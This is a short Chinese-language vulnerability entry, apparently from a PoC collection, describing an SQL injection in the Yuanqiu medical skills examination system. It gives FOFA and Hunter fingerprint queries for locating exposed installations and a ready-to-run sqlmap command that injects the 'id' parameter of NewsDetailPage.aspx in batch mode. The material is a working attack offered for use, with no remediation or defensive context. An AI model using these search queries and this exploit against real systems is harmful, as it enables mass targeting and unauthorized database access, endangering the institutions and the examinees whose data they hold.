# 远秋医学技能考试系统SQL注入

## 网络测绘

fofa: app="远秋医学技能考试系统"

hunter: web.title="远秋医学技能考试系统"

## POC / EXP

```
sqlmap -u "http://xxx.xxx.xxx.xxx/NewsDetailPage.aspx?key=news&id=7" -p id -batch
```